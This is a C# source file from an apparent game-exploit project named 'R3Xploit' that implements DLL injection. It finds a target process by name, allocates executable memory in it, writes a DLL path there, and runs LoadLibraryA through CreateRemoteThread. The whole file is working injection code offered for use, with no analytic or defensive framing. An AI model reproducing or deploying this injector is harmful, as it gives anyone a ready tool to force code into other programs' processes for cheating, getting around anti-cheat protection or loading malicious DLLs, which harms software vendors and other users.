using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace R3Xploit
{
    internal class Injector4
    {
        public enum DllInjectionResult
        {
            DllNotFound,
            GameProcessNotFound,
            InjectionFailed,
            Success,
        }

        public sealed class DllInjector
        {
            private static readonly IntPtr INTPTR_ZERO = (IntPtr)0;
            private static Injector4.DllInjector _instance;

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr OpenProcess(
              uint dwDesiredAccess,
              int bInheritHandle,
              uint dwProcessId);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern int CloseHandle(IntPtr hObject);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr VirtualAllocEx(
              IntPtr hProcess,
              IntPtr lpAddress,
              IntPtr dwSize,
              uint flAllocationType,
              uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern int WriteProcessMemory(
              IntPtr hProcess,
              IntPtr lpBaseAddress,
              byte[] buffer,
              uint size,
              int lpNumberOfBytesWritten);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr CreateRemoteThread(
              IntPtr hProcess,
              IntPtr lpThreadAttribute,
              IntPtr dwStackSize,
              IntPtr lpStartAddress,
              IntPtr lpParameter,
              uint dwCreationFlags,
              IntPtr lpThreadId);

            public static Injector4.DllInjector GetInstance
            {
                get
                {
                    if (Injector4.DllInjector._instance == null)
                        Injector4.DllInjector._instance = new Injector4.DllInjector();
                    return Injector4.DllInjector._instance;
                }
            }

            private DllInjector()
            {
            }

            public Injector4.DllInjectionResult Inject(string sProcName, string sDllPath)
            {
                if (!File.Exists(sDllPath))
                    return Injector4.DllInjectionResult.DllNotFound;
                uint pToBeInjected = 0;
                Process[] processes = Process.GetProcesses();
                for (int index = 0; index < processes.Length; ++index)
                {
                    if (processes[index].ProcessName == sProcName)
                    {
                        pToBeInjected = (uint)processes[index].Id;
                        break;
                    }
                }
                return pToBeInjected == 0U ? Injector4.DllInjectionResult.GameProcessNotFound : (!this.bInject(pToBeInjected, sDllPath) ? Injector4.DllInjectionResult.InjectionFailed : Injector4.DllInjectionResult.Success);
            }

            private unsafe bool bInject(uint pToBeInjected, string sDllPath)
            {
                IntPtr num1 = Injector4.DllInjector.OpenProcess(1082U, 1, pToBeInjected);
                if (num1 == Injector4.DllInjector.INTPTR_ZERO)
                    return false;
                IntPtr procAddress = Injector4.DllInjector.GetProcAddress(Injector4.DllInjector.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (procAddress == Injector4.DllInjector.INTPTR_ZERO)
                    return false;
                IntPtr num2 = Injector4.DllInjector.VirtualAllocEx(num1, (IntPtr)(void*)null, (IntPtr)sDllPath.Length, 12288U, 64U);
                if (num2 == Injector4.DllInjector.INTPTR_ZERO)
                    return false;
                byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
                if (Injector4.DllInjector.WriteProcessMemory(num1, num2, bytes, (uint)bytes.Length, 0) == 0 || Injector4.DllInjector.CreateRemoteThread(num1, (IntPtr)(void*)null, Injector4.DllInjector.INTPTR_ZERO, procAddress, num2, 0U, (IntPtr)(void*)null) == Injector4.DllInjector.INTPTR_ZERO)
                    return false;
                Injector4.DllInjector.CloseHandle(num1);
                return true;
            }
        }
    }
}